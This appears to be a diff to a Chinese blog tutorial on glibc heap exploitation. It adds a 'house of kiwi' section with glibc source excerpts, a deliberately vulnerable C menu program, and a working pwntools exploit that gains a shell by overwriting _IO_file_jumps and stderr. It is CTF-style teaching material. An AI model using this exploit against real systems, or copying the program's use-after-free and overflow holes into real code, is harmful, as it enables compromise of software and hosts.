@@ -274,6 +274,7 @@
     <li><a href="#house-of-strom">house of strom</a></li>
     <li><a href="#house-of-rabbit">house of rabbit</a></li>
     <li><a href="#house-of-orange">house of orange</a></li>
+    <li><a href="#house-of-kiwi">house of kiwi</a></li>
   </ol>
 </nav>
         </div>
@@ -330,7 +331,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 10 分钟
+                    阅读时长: 12 分钟
                 </time>
             </div>
         
@@ -1635,6 +1636,418 @@
 </div>
 </div><p>这里我们可以看到我们通过溢出先改了topchunk的数据，由于我们再编译系统中我们可以知道当我的topchunk大小小于我们需要申请的大小是他会使用brk来重新申请一段topchunk出来进行一个分配，而前面的那一段topchunk会直接释放掉，这样我们就可以获得一个free的一个chunk来得到一个数据，接下来就是通过修改值来获得一些权限了</p>
 <p>这里我们再说一下这个的一个底层原理，当我们free掉这个值以后我们就可以越界写到这个值的这个位置因我们可以吧他的大小改成一个0x61并且再bk上加上io list all-0x10当我们申请的时候会把0x61放到smallbin中并且list-all指向我们的整个bin数组，同时我们0x68的这个偏移上0x61这个位置刚好是chain的位置这样我们就可以修改io list pauts的一个值了</p>
+<h2 id="house-of-kiwi">house of kiwi
+</h2><p>这里新学一个手法，这个house of的手法就是主要的一个原理就是我们在调用的时候可以知道有一些libc的vtable这个指针块他是可以直接进行一个写入的，因此我们尝试对vtable这个字段的指针进行写入，但是由于他也是一种house手法所以他的利用链也是有一个唯一的利用，可以绕过某种手法，他的调用链也是非常的好用的一个调用链。</p>
+<p>这里的参看这个链的一个源代码：</p>
+<p>这里主要调用的一个一个利用点就是在一个sysmalloc的一个位置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">assert</span> <span class="p">((</span><span class="n">old_top</span> <span class="o">==</span> <span class="nf">initial_top</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">old_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">          <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">old_size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">MINSIZE</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">           <span class="nf">prev_inuse</span> <span class="p">(</span><span class="n">old_top</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">           <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">old_end</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/* Precondition: not enough current space to satisfy nb request */</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">assert</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">old_size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在这个位置的一个我们可以看到他对old_top进行了一个检查，而这个检查，并且触发这个检查的一个要求就是当我们的topchunk没有被初始化的时候会被触发一个assert这个函数而assert这个函数的底层使用的是malloc assert这个函数而在这个函数中会存在fflush这个函数，可以通过这个函数会调用到stderr这个io</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">extern</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">__progname</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__malloc_assert</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">assertion</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">line</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		 <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">function</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="nf">__fxprintf</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;%s%s%s:%u: %s%sAssertion `%s&#39; failed.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		     <span class="n">__progname</span><span class="p">,</span> <span class="n">__progname</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?</span> <span class="s">&#34;: &#34;</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		     <span class="n">file</span><span class="p">,</span> <span class="n">line</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		     <span class="n">function</span> <span class="o">?</span> <span class="nl">function</span> <span class="p">:</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">function</span> <span class="o">?</span> <span class="s">&#34;: &#34;</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		     <span class="n">assertion</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span> <span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">abort</span> <span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">_IO_fflush</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_IO_flush_all</span> <span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="nf">_IO_SYNC</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">?</span> <span class="nl">EOF</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_fflush</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因此我们可以知道我们利用链，sysmallc-&gt;assert()-&gt;__malloc_assert-&gt;fflush(stderr)-&gt;_IO_SYNC-&gt;vtable</p>
+<p>而这个手法利用的主要一个原因是因为当我们遇到没有调用io时获得的一个手法，由于我们没有调用io的使用时可以使用这个手法来进行一个攻击，他攻击的原来是通过sysmalloc中对top chunk的一个重置来调用io从而触发漏洞但是这个手法同样也有一个orw的一个手法，那么我这里先对一个普通的手法进行一个更新,这里我会放出c文件</p>
+<p>c:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define puts(str) write(1, str, strlen(str)), write(1, &#34;\n&#34;, 1)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;1. add chunk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;2. delete chunk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3. edit chunk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;4. show chunk&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;5. exit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;choice:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_num</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add_chunk</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;index:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;size:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete_chunk</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;index:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">edit_chunk</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;index:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;length:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;content:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">show_chunk</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;index:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">menu</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">choice</span> <span class="o">=</span> <span class="nf">get_num</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">add_chunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">delete_chunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">edit_chunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">show_chunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;invalid choice.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>exp:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">elf = ELF(&#34;./pwn&#34;)
+</span></span><span class="line"><span class="cl">libc = ELF(&#34;./libc.so.6&#34;)
+</span></span><span class="line"><span class="cl">context(arch=elf.arch, os=elf.os)
+</span></span><span class="line"><span class="cl">context.log_level = &#39;debug&#39;
+</span></span><span class="line"><span class="cl">p = process([elf.path])
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def add_chunk(index, size):
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;choice:&#34;, &#34;1&#34;)
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;index:&#34;, str(index))
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;size:&#34;, str(size))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def delete_chunk(index):
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;choice:&#34;, &#34;2&#34;)
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;index:&#34;, str(index))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def edit_chunk(index, content):
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;choice:&#34;, &#34;3&#34;)
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;index:&#34;, str(index))
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;length:&#34;, str(len(content)))
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;content:&#34;, content)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def show_chunk(index):
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;choice:&#34;, &#34;4&#34;)
+</span></span><span class="line"><span class="cl">    p.sendafter(&#34;index:&#34;, str(index))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">add_chunk(0, 0x100)
+</span></span><span class="line"><span class="cl">add_chunk(1, 0x100)
+</span></span><span class="line"><span class="cl">add_chunk(2, 0x100)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">delete_chunk(0)
+</span></span><span class="line"><span class="cl">show_chunk(0)
+</span></span><span class="line"><span class="cl">p.recv()
+</span></span><span class="line"><span class="cl">heap_base = u64(p.recv(5)[-5:].ljust(8, b&#39;\x00&#39;)) &lt;&lt; 12
+</span></span><span class="line"><span class="cl">info(&#34;heap base: &#34; + hex(heap_base))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">edit_chunk(0, p64(heap_base &gt;&gt; 12) + p64(0))
+</span></span><span class="line"><span class="cl">delete_chunk(0)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">edit_chunk(0, p64((heap_base &gt;&gt; 12) ^ (heap_base + 0x20)))
+</span></span><span class="line"><span class="cl">add_chunk(0, 0x100)
+</span></span><span class="line"><span class="cl">add_chunk(0, 0x100)
+</span></span><span class="line"><span class="cl">edit_chunk(0, b&#39;\x00&#39; * 14 + p16(0x7))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">delete_chunk(1)
+</span></span><span class="line"><span class="cl">show_chunk(1)
+</span></span><span class="line"><span class="cl">p.recv()
+</span></span><span class="line"><span class="cl">libc.address = u64(p.recv(6)[-6:].ljust(8, b&#39;\x00&#39;)) - 0x1f2ce0
+</span></span><span class="line"><span class="cl">info(&#34;libc base: &#34; + hex(libc.address))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def arbitrary_address_write(address, content):
+</span></span><span class="line"><span class="cl">    align = address &amp; 0xF
+</span></span><span class="line"><span class="cl">    address &amp;= ~0xF
+</span></span><span class="line"><span class="cl">    edit_chunk(0, (b&#39;\x00&#39; * 14 + p16(0x7)).ljust(0xe8, b&#39;\x00&#39;) + p64(address))
+</span></span><span class="line"><span class="cl">    add_chunk(1, 0x100)
+</span></span><span class="line"><span class="cl">    edit_chunk(1, b&#39;\x00&#39; * align + bytes(content))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">onegadget = [0xdb1f1,0xdb1f4 ,0xdb1f7 ][0]+libc.address
+</span></span><span class="line"><span class="cl">arbitrary_address_write(libc.sym[&#39;_IO_file_jumps&#39;],p64(libc.sym[&#39;system&#39;])*0x10)
+</span></span><span class="line"><span class="cl">arbitrary_address_write(libc.sym[&#39;_IO_2_1_stderr_&#39;],b&#39;/bin/sh\x00&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">edit_chunk(2,b&#39;\x00&#39;*0x110)
+</span></span><span class="line"><span class="cl">add_chunk(0,0x300)
+</span></span><span class="line"><span class="cl"># gdb.attach(p)
+</span></span><span class="line"><span class="cl">p.interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来我们来查看orw的一个写法</p>
 
 </section>
 
